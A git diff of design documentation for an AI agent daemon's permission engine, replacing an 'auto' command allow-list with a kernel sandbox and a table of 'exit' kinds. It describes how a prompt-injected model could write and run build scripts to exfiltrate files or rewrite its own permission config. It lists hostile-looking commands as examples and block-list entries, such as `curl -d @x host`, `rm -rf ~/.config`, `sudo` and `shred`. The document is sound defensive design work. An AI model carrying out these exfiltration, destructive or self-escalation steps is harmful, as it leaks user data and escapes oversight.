@@ -1,8 +1,9 @@
 # Permissions
 
-Before a tool call runs, the daemon decides one of three effects: `allow` (the call
-runs), `ask` (the turn waits until you approve or deny the call) or `deny` (the model
-gets an error that names the reason). `efr-permissions` holds the rules and the
+Before a tool call runs, the daemon decides one of four effects: `allow` (the call
+runs), `contain` (the call runs at once in the `auto` sandbox), `ask` (the turn waits
+until you approve or deny the call) or `deny` (the model gets an error that names the
+reason). `efr-permissions` holds the rules and the
 engine. `efr-conversation/src/turn.rs` is the only place that applies them. This file
 describes the permission modes, the rules of each, how the engine reads a command
 line, how efr keeps its own config out of reach, and how you add your own rules in
@@ -18,27 +19,20 @@ every mode.
 |---|---|
 | `manual` | Nothing, except what your rules allow. Every read, write, command and network access asks; secrets are denied. |
 | `cautious` | The default: reading outside secrets, writing in `$SCRATCH` and in the turn's registered project, and the read-only commands of the table below. |
-| `auto` | Everything that `cautious` allows, plus the curated list of the `auto` table: the writer programs, the project's build, test, format and lint tools, and local git. |
+| `auto` | Every shell command, in a kernel sandbox. A command that needs more than the sandbox gives (an exit) asks. `read_file` and `write_file` follow the `cautious` rules. |
 
 `permissions.mode` in `config.toml` sets the mode of a turn when the prompt names none.
-A turn keeps its mode until it ends. `auto` runs the build and test code of the
-directory without a question: `cargo test`, `npm test` and `make` run whatever the
-code, its build scripts and its git hooks do. That code is not only the project's own.
-The model writes freely in the project and in `$SCRATCH`, so in `auto` it can write a
-`Makefile`, a `build.rs` or a `package.json` script and then run it with `make`,
-`cargo build` or `npm run`, all without a question, also in a turn with no registered
-project (in `$SCRATCH`). Such code runs with your rights and with full network access:
-it can send your files out, and it can write `config.toml`, which the daemon reloads
-without a question. So the engine's limits, config protection and the approval of the
-settings tool do not hold against a model that follows injected instructions (from a
-web page, a file or a command's output) in `auto`. Choose `auto` only for work where
-you accept that. The commands that `auto` itself allows never reach the network
-outside the package rows; see "The auto table".
+A turn keeps its mode until it ends. In `auto`, the kernel holds what a command does:
+the command, and each build script, test and hook that it starts, can write only in
+the turn's project, the registered projects that the line names, `$SCRATCH`, a private
+`/tmp` and private cache layers. It has no network, it cannot use `sudo`, D-Bus or
+other sockets, and secrets read as empty. A command that needs more is an exit, and
+the engine finds it before the run; see "The auto sandbox".
 
 A registered project is a directory that you list in `projects.toml` in efr's config
 directory. A turn whose hidden shell is in a project's root or below it runs in that
-project: `cautious` writes freely below the root, and `auto` also runs the project's
-build, test and git commands there. `efr project add` registers the git work tree
+project: `cautious` writes freely below the root, and `auto` makes it a write root of
+the sandbox. `efr project add` registers the git work tree
 that holds the current directory (or the directory itself), `efr project add PATH`
 registers PATH, `efr project list` shows the projects and `efr project remove PATH`
 takes one out. The daemon makes the change: it keeps the comments of the file and a
@@ -53,7 +47,8 @@ A turn from the phone runs with at most `cautious`: `auto` there counts as
 
 A tool call declares what it needs: the paths it reads or writes, the command line it
 runs, network access, and input at the terminal. The engine gives each requirement an
-effect. The strictest effect decides the call, in the order `allow < ask < deny`.
+effect. The strictest effect decides the call, in the order
+`allow < contain < ask < deny`.
 
 1. The machine policy sets the effect of each requirement. It is the built-in policy
    of the turn's mode, then your `[[permissions.rules]]`. The last rule that matches
@@ -122,7 +117,7 @@ The `cautious` mode, the default, decides by these rules:
 | 8 and on | execute | a read-only command below | allow |
 
 The `manual` mode keeps only rule 0 and rule 7, as its rules 0 and 1. The `auto` mode
-keeps all of them and adds the `auto` table after them.
+has a table of its own; see "The auto sandbox".
 
 Rule 0 makes every command line and all network access ask. The rules from 8 on allow
 read-only commands. A command matches a row when it starts with the program and the
@@ -249,117 +244,80 @@ different places. What the check cannot prove matches no row.
 `crates/efr-permissions/src/policy/defaults.rs` holds the table as data. A test keeps
 this file, the table in the crate and the data equal.
 
-## The auto table
+## The auto sandbox
 
-The `auto` mode adds these rows to the rules of `cautious`. Each row becomes one
-`execute` rule for each place where it may run, and the rows marked "Network" one
-`network` rule more for each place. The `#` column numbers those rules, as a reason
-names them, such as `by rule 93 of the machine policy`.
+In `auto`, the engine decides a shell call by this table, then by your rules:
 
-- **Writer programs**, anywhere: `rm`, `rmdir`, `mkdir`, `touch`, `mv`, `cp`, `ln`,
-  `chmod`, `truncate` and `tee`. The shell tool declares their operands as writes in
-  every mode (see "Which paths a command reads"), so the path rules decide: in the
-  turn's project or `$SCRATCH` the call runs; a write to the project's root itself,
-  above it or anywhere else asks; a secret or efr's config is denied. `rm -rf ..`
-  in the project root asks, `mv src ~/x` asks, and `rm ~/.ssh/known_hosts` is denied
-  in every mode.
-- **Build, test, format and lint tools**, only while the hidden shell is in the
-  turn's project or in `$SCRATCH` (`under = "project"` and `under = "scratch"`):
-  `cargo`, `just`, `make`, `npm`, `pnpm`, `yarn`, `bun`, `go`, `pytest`, `uv`, `ruff`,
-  `mypy`, `rustfmt`, `prettier`, `eslint`, `tsc` and `zig build`. Options that point
-  them at another directory, another manifest, another registry or another shell are
-  forbidden, and so is an operand that installs a package the project does not
-  declare (`npm install left-pad`, `go run x@latest`). `cargo test` outside the
-  project asks.
-- **Local git**, in the project or `$SCRATCH`: `add`, `commit`, `switch`, `checkout`
-  of a branch, `restore --staged`, `stash` with `push`, `list`, `show`, `apply` or
-  `pop`, `merge`, `rebase` (not `-i`, not `--exec`), `cherry-pick`, `tag` (to create
-  one), `mv`, `rm`, `worktree add` and `worktree list`, and `fetch` and `pull` from a
-  remote the repository names. The check `ref_names` lets `checkout`, `fetch` and
-  `pull` take only words that git reads as a ref or a remote: `git checkout -- .`,
-  `git checkout .` and `git fetch https://host/x` ask. `git checkout` takes one
-  branch, or `-b` with a new branch and the commit it starts at, so
-  `git checkout main src/x.rs` asks. The text cannot tell a branch from a file of the
-  same name, so `git checkout NAME` restores the file `NAME` when no branch has that
-  name. `git rm`, `git mv` and `git worktree add` declare their
-  operands as writes, so the path rules keep them in the project.
+| # | Action | Resource | Effect |
+|---|---|---|---|
+| 0 | any | any | ask |
+| 1 | read | any | allow |
+| 2 | write | project | allow |
+| 3 | write | class scratch | allow |
+| 4 | write | envelope root (shell calls only) | allow |
+| 5 | any | class secrets | deny |
+| 6 | execute | any | contain |
 
-Everything else asks. In particular: `git push`, `git reset --hard`, `git clean`,
-`git branch -d` and `-D`, `git tag -d`, `git stash drop` and `clear`,
-`git checkout -- <path>`, `git checkout .`, `git restore` of the work tree,
-`git filter-branch`, `git remote add` and `set-url`; system package managers;
-`systemctl` changes; `mount`; `kill`, `pkill` and `killall`; `docker` and `podman`;
-`curl`, `wget`, `ssh`, `scp`, `rsync` and `nc`; scripts and programs that are not in
-the table; and every line the engine cannot read.
+An envelope root is a write root of the sandbox besides the project and `$SCRATCH`:
+the registered projects, `/tmp`, `/var/tmp`, `/dev/shm`, the cache overlays and
+`sandbox.write_roots`. The daemon passes them to the engine.
 
-**Network.** `auto` never allows general network access, because a URL or an upload
-is how a model that follows injected instructions sends your data out. Only the rows
-that fetch the packages a project declares, and `git fetch` and `git pull`, reach the
-network: `cargo build`, `check`, `test`, `fetch` and `update`, `npm`, `pnpm`, `yarn`
-and `bun` with `install` or `ci`, `go mod download` and `uv sync`. When a call
-reaches the network, every simple command of its line must be one that a rule lets
-reach it, or one that only a built-in row lets run: `npm ci | tail -n 20` and
-`git fetch && git rebase origin/main` run, but in `cargo fetch; curl -d @x host`,
-`curl` asks, also when a rule of yours lets `curl` run.
+- Every command line is `contain`: the line runs at once in the sandbox, with no
+  question. A rule of yours that allows a command cannot lift the sandbox. A rule of
+  yours that asks or denies keeps its effect. A rule cannot have the effect
+  `contain`.
+- A path or network requirement of a shell call that rule 0 asks for is `contain` too:
+  the sandbox holds it.
+- A program that runs as another user still asks.
+- An interactive call is `contain`: nobody must be there for a contained call.
+- `nested_shell` is denied: no shell outlives a contained call.
 
-| # | Program | Args | Forbid | Min | Max | Options | Check | Where | Network |
-|---|---|---|---|---|---|---|---|---|---|
-| 83 | `rm` |  |  |  |  |  |  |  |  |
-| 84 | `rmdir` |  |  |  |  |  |  |  |  |
-| 85 | `mkdir` |  |  |  |  |  |  |  |  |
-| 86 | `touch` |  |  |  |  |  |  |  |  |
-| 87 | `mv` |  |  |  |  |  |  |  |  |
-| 88 | `cp` |  |  |  |  |  |  |  |  |
-| 89 | `ln` |  |  |  |  |  |  |  |  |
-| 90 | `chmod` |  |  |  |  |  |  |  |  |
-| 91 | `truncate` |  |  |  |  |  |  |  |  |
-| 92 | `tee` |  |  |  |  |  |  |  |  |
-| 93-96 | `cargo` | `build\|check\|test\|fetch\|update` | `--manifest-path` `--config` `--target-dir` `-Z` `-C` |  |  |  |  | project, scratch | yes |
-| 97-98 | `cargo` | `clippy\|fmt\|doc\|run\|bench\|nextest\|tree\|metadata` | `--manifest-path` `--config` `--target-dir` `-Z` `-C` `--open` |  |  |  |  | project, scratch |  |
-| 99-100 | `just` |  | `-f` `--justfile` `-d` `--working-directory` `-g` `--global-justfile` `--set` `-c` `--command` `--shell*` `--dotenv-path` `=` |  |  |  |  | project, scratch |  |
-| 101-102 | `make` |  | `-C` `--directory` `-f` `--file` `--makefile` `-I` `--include-dir` `--eval` `-E` `=` |  |  |  |  | project, scratch |  |
-| 103-106 | `npm` | `install\|ci` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  | 0 |  |  | project, scratch | yes |
-| 107-108 | `npm` | `run\|test\|build\|lint` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  |  |  |  | project, scratch |  |
-| 109-112 | `pnpm` | `install\|ci` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  | 0 |  |  | project, scratch | yes |
-| 113-114 | `pnpm` | `run\|test\|build\|lint` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  |  |  |  | project, scratch |  |
-| 115-118 | `yarn` | `install\|ci` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  | 0 |  |  | project, scratch | yes |
-| 119-120 | `yarn` | `run\|test\|build\|lint` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  |  |  |  | project, scratch |  |
-| 121-124 | `bun` | `install\|ci` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  | 0 |  |  | project, scratch | yes |
-| 125-126 | `bun` | `run\|test\|build\|lint` | `--script-shell` `--prefix` `--dir` `--cwd` `-C` `-g` `--global` `--location` `--registry` `--userconfig` |  |  |  |  | project, scratch |  |
-| 127-128 | `go` | `build\|test\|vet\|fmt\|run` | `-C*` `-modfile*` `-overlay*` `-toolexec*` `-exec*` `@` |  |  |  |  | project, scratch |  |
-| 129-130 | `go` | `mod` `tidy` | `-C*` `-modfile*` `-overlay*` `-toolexec*` `-exec*` `@` |  |  |  |  | project, scratch |  |
-| 131-134 | `go` | `mod` `download` | `-C*` `-modfile*` `-overlay*` `-toolexec*` `-exec*` `@` |  | 0 |  |  | project, scratch | yes |
-| 135-136 | `pytest` |  | `--rootdir` `-c` `--config-file` `-p` |  |  |  |  | project, scratch |  |
-| 137-138 | `uv` | `run` | `--directory` `--project` `--with*` `--index*` `--extra-index-url` `--default-index` `--find-links` |  |  |  |  | project, scratch |  |
-| 139-142 | `uv` | `sync` | `--directory` `--project` `--with*` `--index*` `--extra-index-url` `--default-index` `--find-links` |  | 0 |  |  | project, scratch | yes |
-| 143-144 | `ruff` |  |  |  |  |  |  | project, scratch |  |
-| 145-146 | `mypy` |  |  |  |  |  |  | project, scratch |  |
-| 147-148 | `rustfmt` |  |  |  |  |  |  | project, scratch |  |
-| 149-150 | `prettier` |  |  |  |  |  |  | project, scratch |  |
-| 151-152 | `eslint` |  |  |  |  |  |  | project, scratch |  |
-| 153-154 | `tsc` |  |  |  |  |  |  | project, scratch |  |
-| 155-156 | `zig` | `build` | `-p` `--prefix*` `--build-file` |  |  |  |  | project, scratch |  |
-| 157-158 | `git` | `add` |  |  |  |  |  | project, scratch |  |
-| 159-160 | `git` | `commit` |  |  |  |  |  | project, scratch |  |
-| 161-162 | `git` | `switch` | `--discard-changes` `-f` `--force` |  |  |  |  | project, scratch |  |
-| 163-164 | `git` | `checkout` | `-p` `--patch` `-f` `--force` `--ours` `--theirs` `-m` `--merge` `--conflict` `--overlay` `--no-overlay` `--pathspec-from-file` |  | 1 |  | `ref_names` | project, scratch |  |
-| 165-166 | `git` | `checkout` `-b\|-B` | `-p` `--patch` `-f` `--force` `--ours` `--theirs` `-m` `--merge` `--conflict` `--overlay` `--no-overlay` `--pathspec-from-file` |  | 2 |  | `ref_names` | project, scratch |  |
-| 167-168 | `git` | `restore` `--staged\|-S` | `-W` `--worktree` `-p` `--patch` |  |  |  |  | project, scratch |  |
-| 169-170 | `git` | `stash` |  |  | 0 | 0 |  | project, scratch |  |
-| 171-172 | `git` | `stash` `push\|list\|show\|apply\|pop` |  |  |  |  |  | project, scratch |  |
-| 173-174 | `git` | `merge` | `-s` `--strategy` |  |  |  |  | project, scratch |  |
-| 175-176 | `git` | `rebase` | `-i` `--interactive` `-x` `--exec` `--edit-todo` `-s` `--strategy` |  |  |  |  | project, scratch |  |
-| 177-178 | `git` | `cherry-pick` | `-s` `--strategy` |  |  |  |  | project, scratch |  |
-| 179-180 | `git` | `tag` | `-d` `--delete` `-f` `--force` `-s` `--sign` `-u` `--local-user` `-v` `--verify` |  |  |  |  | project, scratch |  |
-| 181-182 | `git` | `mv` |  |  |  |  |  | project, scratch |  |
-| 183-184 | `git` | `rm` |  |  |  |  |  | project, scratch |  |
-| 185-186 | `git` | `worktree` `add\|list` |  |  |  |  |  | project, scratch |  |
-| 187-190 | `git` | `fetch` | `--upload-pack` `--exec` `-o` `--server-option` `-s` `--strategy` |  |  |  | `ref_names` | project, scratch | yes |
-| 191-194 | `git` | `pull` | `--upload-pack` `--exec` `-o` `--server-option` `-s` `--strategy` |  |  |  | `ref_names` | project, scratch | yes |
+**Exits.** An action that leaves the sandbox is an exit. The engine reads the line,
+the paths that the tool declares and the facts that the daemon collects, and gives
+each exit its own reason. An exit asks; `secret` and `config` are denied. Each exit
+has a kind:
 
-`crates/efr-permissions/src/policy/auto.rs` holds the table as data, with the
-reasons for each `forbid` list. A test keeps this file, `policy/auto.md` and the data
-equal.
+| Kind | Examples |
+|---|---|
+| `write` | a write outside the write roots: `echo x > ~/notes.txt`, `git worktree add ../wt` |
+| `host` | a network need: `curl`, `git fetch`, `npm ci`, `checkupdates` |
+| `host_view` | `ss`, `ip`, `nmcli`, `netstat` |
+| `socket`, `bus` | a Unix socket; `hostnamectl`, `systemctl --failed`, `loginctl list-sessions` |
+| `desktop_ipc` | `xrandr`, `swaymsg`, `hyprctl`, `xdotool` (only you approve) |
+| `device` | a node below `/dev` that the sandbox does not have: `nvme smart-log /dev/nvme0n1` |
+| `masked_read` | a read of a masked path: `.env`, `~/.zsh_history`, a browser profile (only you approve) |
+| `destructive` | `git reset --hard`, `git clean -f`, `git checkout -- P`, `dd of=`, `shred`, `: > F`, `rm -r` of tracked files |
+| `privilege` | `sudo`, `doas`, `pkexec`, `run0`, `yay`, `paru`, `docker`, `podman`, a changing `systemctl`, `busctl call` (only you approve) |
+| `persistence` | `~/.zshrc`, `crontab`, `systemctl --user enable`, `loginctl enable-linger`, autostart, `.envrc` or `.git/hooks` in a project (only you approve) |
+| `upload` | `git push`, `npm publish`, `scp`, `rsync host:`, `curl -d`, `-F`, `-T` or `-X POST` (only you approve) |
+| `synced_write` | a write to `~/Dropbox` and the other `sandbox.synced_dirs` (only you approve) |
+| `above_root` | a write at or above a write root or efr's config: `rm -rf ..`, `rm -rf ~/.config` (only you approve) |
+| `outside` | the model asks to run outside the sandbox |
+| `secret`, `config` | a read or write of a secret, a write of efr's config: denied |
+
+The engine reads every line, also one with a substitution or a group, and finds the
+exits that it can see. Text can only add a question; the sandbox holds what the text
+does not show. When a fact is missing, the engine assumes the stricter case: a target
+exists, and a directory holds tracked files.
+
+After a command fails in the sandbox, the model can call `shell` again with `needs`:
+paths to write, hosts, sockets, a bus, a device, masked paths to read, or `outside`.
+Each entry is an exit that asks. Other modes ignore `needs`.
+
+An exit of the kinds `privilege`, `persistence`, `upload`, `outside`, `synced_write`,
+`above_root`, or a write that no bind can serve, runs outside the sandbox. Such a line
+must be one command, plus read-only helpers from the table above, such as `echo` in
+`echo x | sudo tee /etc/x.conf`. `sudo -v && ./helper` gets an error with no question.
+
+`read_file`, `write_file` and edits run in the daemon, outside the sandbox. In `auto`
+they follow the rules of `cautious`. A read of a masked path asks (`masked_read`), and
+a write to a protected name (`.envrc`, `.claude/`, `.vscode/` and the others of
+`PROTECTED_NAMES`) or to a git setting inside a write root asks (`persistence`).
+
+A turn from the phone runs with at most `cautious`, so it is never contained.
+`crates/efr-permissions/src/exits.rs` holds the exit rules, and
+`crates/efr-permissions/tests/fixtures/auto-corpus.toml` holds the result for each
+line of the command corpus.
 
 ## How the engine reads a command line
 
@@ -496,8 +454,8 @@ and the project registry `projects.toml`), in any mode. When `config.toml`, or a
 other entry of that directory, is a symbolic link, the real file behind it is
 protected too, such as `~/dotfiles/efr/config.toml` in a dotfiles repository; so is
 the real directory when the directory itself is a link. The config sets your
-permission rules and the registry defines the project that `auto` trusts, so a model
-that could write them could give itself any permission.
+permission rules and the registry defines the write roots of `auto`, so a model that
+could write them could give itself any permission.
 
 - `write_file`, an output redirection (`> ~/.config/efr/config.toml`), a writer program
   (`cp x ~/.config/efr/config.toml`, `ln -sf x ~/.config/efr/config.toml`,
@@ -510,12 +468,9 @@ that could write them could give itself any permission.
   allows it.
 - Reading it is free in `cautious` and `auto`; it holds no secrets.
 
-Config protection judges what a call declares. A build or a test that `auto` runs
-runs the code of the directory, which the model may have written itself in the same
-turn, and that code can write any file you can, efr's config included. The daemon
-reloads a changed `config.toml` without a question, so such code can change the
-permissions of the next turn. This is one more reason to choose `auto` only for work
-where you accept that the model runs code of its own.
+Config protection judges what a call declares. In `auto`, a write of efr's config is
+a `config` exit, which is denied. In the sandbox, efr's config is read-only, so the
+code that a contained command runs cannot write it either.
 
 You change the file yourself, in your editor or with `efr config`, or you approve a
 change of the settings tool. The daemon reads the links in the directory each time it
@@ -591,9 +546,9 @@ Put your rules in `$XDG_CONFIG_HOME/efr/config.toml`. Each rule has an `action`
   - `check`: a check of the words after `args` that words alone cannot express:
     `"sed_print_only"` (for `sed` only) or `"ref_names"`, as the tables above use them.
 
-With the action `network`, a command rule lets that command reach the network, as the
-fetching rows of the `auto` table do. A command rule with the action `any` lets the
-command run but never opens the network.
+With the action `network`, a command rule lets that command reach the network. A
+command rule with the action `any` lets the command run but never opens the network.
+In `auto`, no rule opens the sandbox's network: a network need is a `host` exit.
 
 Your rules come after the built-in rules, so the last one of yours that matches wins.
 Your rules are the only rules that can open a secret, and only a rule that names it
@@ -621,7 +576,7 @@ effect = "allow"
 in `~/p/app` or below it, in every mode. In `~/p/other`, and after a `cd` in the same
 line, they ask. `cargo test` builds and runs the project's own code, so allow it only
 in projects whose code you trust. `under = "project"` allows it in whichever project a
-turn runs in, as the `auto` mode does.
+turn runs in.
 
 ### Example: allow `systemctl restart nginx`
 
